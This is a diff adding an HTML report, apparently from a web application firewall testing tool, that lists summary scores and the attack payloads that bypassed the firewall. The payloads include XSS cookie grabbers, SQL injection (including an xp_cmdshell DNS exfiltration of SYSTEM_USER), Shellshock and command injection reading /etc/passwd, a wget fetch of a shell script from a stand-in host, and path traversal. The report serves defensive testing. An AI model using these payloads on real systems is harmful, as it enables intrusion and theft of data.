+                    <div class="summary__grid--row-item">112</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                    
+                <div class="summary__grid--row-sum">
+                    <div class="summary__grid--row-item">Summary for owasp</div>
+                    <div class="summary__grid--row-item">77.99%</div>
+                    <div class="summary__grid--row-item">152</div>
+                    <div class="summary__grid--row-item">27</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    
+                    <div class="summary__grid--row-item">180</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                
+                
+                <div class="summary__grid--row-sum">
+                    <div class="summary__grid--row-item">Summary for true-positive tests</div>
+                    <div class="summary__grid--row-item">90.77%</div>
+                    <div class="summary__grid--row-item">305</div>
+                    <div class="summary__grid--row-item">31</div>
+                    
+                    <div class="summary__grid--row-item">1</div>
+                    
+                    <div class="summary__grid--row-item">337</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                
+            </div>
+            
+            
+            <h4 class="detail__sub-sub-title">True-negative tests</h4>
+            <div class="summary__grid">
+                <div class="summary__grid--head">
+                    <div class="summary__grid--head-item">Test set</div>
+                    <div class="summary__grid--head-item">Test case</div>
+                    <div class="summary__grid--head-item">Percentage</div>
+                    <div class="summary__grid--head-item">Blocked</div>
+                    <div class="summary__grid--head-item">Bypassed</div>
+                    
+                    <div class="summary__grid--head-item">Unresolved</div>
+                    
+                    <div class="summary__grid--head-item">Sent</div>
+                    <div class="summary__grid--head-item">Failed</div>
+                </div>
+                
+                    
+                <div class="summary__grid--row">
+                    <div class="summary__grid--row-item">false-pos</div>
+                    <div class="summary__grid--row-item">texts</div>
+                    <div class="summary__grid--row-item">95.74%</div>
+                    <div class="summary__grid--row-item">6</div>
+                    <div class="summary__grid--row-item">135</div>
+                    
+                    <div class="summary__grid--row-item">0</div>
+                    
+                    <div class="summary__grid--row-item">141</div>
+                    <div class="summary__grid--row-item">0</div>
+                </div>
+                    
+                    
+                
+                
+            </div>
+            
+            
+            <h3 class="detail__sub-title">True Negative Tests</h3>
+            <p>135 true-negative requests identified as bypassed (test passed, good behavior)</p>
+            <p>6 true-negative requests identified as blocked (test failed, bad behavior)</p>
+            
+            
+            <div class="positive__grid">
+                <div class="positive__grid--head">
+                    <div class="positive__grid--head-item">Payload</div>
+                    <div class="positive__grid--head-item">Test case</div>
+                    <div class="positive__grid--head-item">Encoder</div>
+                    <div class="positive__grid--head-item">Placeholder</div>
+                    <div class="positive__grid--head-item">Status</div>
+                </div>
+                
+                    
+                        
+                        
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">lhttps://www.instagram.com/p/B_uHgI7lY0Z/?igshid=1m7xkk7a9v6z4&amp;utm_source=ig_web_copy_linkCan I please get the id for the user that I am trying to follow?</div>
+                    <div class="positive__grid--row-item">texts</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLForm, URLParam</div>
+                    <div class="positive__grid--row-item">403</div>
+                </div>
+                    
+                
+                    
+                        
+                        
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">url=http://www.example.com/tan?usp=4#8</div>
+                    <div class="positive__grid--row-item">texts</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">URLParam, HTMLForm</div>
+                    <div class="positive__grid--row-item">403</div>
+                </div>
+                    
+                
+                    
+                        
+                        
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">url=https://api.twitter.com/1.1/statuses/user_timeline.json?screen_name=twitterapi&amp;count=2&amp;include_rts=1&amp;exclude_replies=1</div>
+                    <div class="positive__grid--row-item">texts</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">URLParam, HTMLForm</div>
+                    <div class="positive__grid--row-item">403</div>
+                </div>
+                    
+                
+            </div>
+            
+            
+            
+            
+            <h3 class="detail__sub-title">Bypasses in Details</h3>
+            <p>31 malicious requests have bypassed the security solution</p>
+            
+            
+            <div class="positive__grid">
+                <div class="positive__grid--head">
+                    <div class="positive__grid--head-item">Payload</div>
+                    <div class="positive__grid--head-item">Test case</div>
+                    <div class="positive__grid--head-item">Encoder</div>
+                    <div class="positive__grid--head-item">Placeholder</div>
+                    <div class="positive__grid--head-item">Status</div>
+                </div>
+                
+                    
+                    
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">&amp;lt;svg/onload&amp;equals;alert(1)&amp;gt;</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">() { :; }; echo ; /bin/bash -c &#39;cat /etc/passwd&#39;</div>
+                    <div class="positive__grid--row-item">rce-urlparam</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">(select(0)from(select(sleep(15)))v)/*&#39;&#43;(select(0)from(select(sleep(15)))v)&#43;&#39;%22&#43;(select(0)from(select(sleep(15)))v)&#43;%22*/</div>
+                    <div class="positive__grid--row-item">sql-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">-1134&#39;)  OR JSON_EXTRACT(&#39;{&#39;&#39;aKER&#39;&#39;: 9648}&#39;, &#39;$.aKER&#39;) = 9648*7799 AND (&#39;QlYa&#39; LIKE &#39;QlYa</div>
+                    <div class="positive__grid--row-item">sql-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm, Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">/*!%55NiOn*/%20/*!%53eLEct*/&#43;</div>
+                    <div class="positive__grid--row-item">community-sqli</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">/static/img/../../etc/passwd</div>
+                    <div class="positive__grid--row-item">path-traversal</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">123) AND 12=12  AND JSON_DEPTH(&#39;{}&#39;) != 2521</div>
+                    <div class="positive__grid--row-item">sql-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">Header, HTMLMultipartForm, HTMLForm, URLParam</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">123) AND 12=12  AND JSON_DEPTH(&#39;{}&#39;) != 2521</div>
+                    <div class="positive__grid--row-item">sql-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">URLPath</div>
+                    <div class="positive__grid--row-item">404</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c=&#39;ping &#39;&#43;master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))&#43;&#39;.000.burpcol&#39;&#43;&#39;laborator.net&#39;;/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3</div>
+                    <div class="positive__grid--row-item">sql-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm, Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">; cat /et&#39;c/pa&#39;ss&#39;wd</div>
+                    <div class="positive__grid--row-item">rce</div>
+                    <div class="positive__grid--row-item">Plain</div>
+                    <div class="positive__grid--row-item">Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">;wget http://some_host/sh311.sh</div>
+                    <div class="positive__grid--row-item">shell-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">&lt;&lt;scr�ipt/src=http://xss.com/xss.js&gt;&lt;/script</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">&lt;xssBypass/onpointermove=(confirm)(1)&gt;MoveMouseHere</div>
+                    <div class="positive__grid--row-item">community-xss</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">\&#34;autof&lt;x&gt;ocus o&lt;x&gt;nfocus=alert&lt;x&gt;(1)//</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">\\::1\c$\users\default\ntuser.dat</div>
+                    <div class="positive__grid--row-item">path-traversal</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">alert.apply(null, [1])</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">alert.call(%20, &#34;XSS&#34;);</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">alert?.(document?.cookie)</div>
+                    <div class="positive__grid--row-item">community-xss</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">ax--exec=`id`--remote=origin</div>
+                    <div class="positive__grid--row-item">rce</div>
+                    <div class="positive__grid--row-item">Plain</div>
+                    <div class="positive__grid--row-item">Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">cmd=127.0.0.1 &amp;&amp; ls /etc</div>
+                    <div class="positive__grid--row-item">rce</div>
+                    <div class="positive__grid--row-item">Plain</div>
+                    <div class="positive__grid--row-item">Header</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">confirm.call(null,1)</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">document[&#34;cookie&#34;]</div>
+                    <div class="positive__grid--row-item">community-xss</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">prompt.call(null,1)</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                        
+                            
+                            
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">| set /a 3482*7301</div>
+                    <div class="positive__grid--row-item">shell-injection</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">HTMLForm, URLParam, HTMLMultipartForm</div>
+                    <div class="positive__grid--row-item">200</div>
+                </div>
+                        
+                    
+                
+            </div>
+            
+            
+            
+            <h3 class="detail__sub-title">Unresolved requests in Details</h3>
+            <p>1 requests identified as blocked and passed or as not-blocked and not-passed</p>
+            
+            <div class="positive__grid">
+                <div class="positive__grid--head">
+                    <div class="positive__grid--head-item">Payload</div>
+                    <div class="positive__grid--head-item">Test case</div>
+                    <div class="positive__grid--head-item">Encoder</div>
+                    <div class="positive__grid--head-item">Placeholder</div>
+                    <div class="positive__grid--head-item">Status</div>
+                </div>
+                
+                    
+                        
+                        
+                <div class="positive__grid--row">
+                    <div class="positive__grid--row-item-payload mono">&lt;&lt;scr�ipt/src=http://xss.com/xss.js&gt;&lt;/script</div>
+                    <div class="positive__grid--row-item">xss-scripting</div>
+                    <div class="positive__grid--row-item">URL</div>
+                    <div class="positive__grid--row-item">URLPath</div>
+                    <div class="positive__grid--row-item">400</div>
+                </div>
+                    
+                
+            </div>
+            
+            
+            
+        </div>
+    </main>
+</body>
+</html>
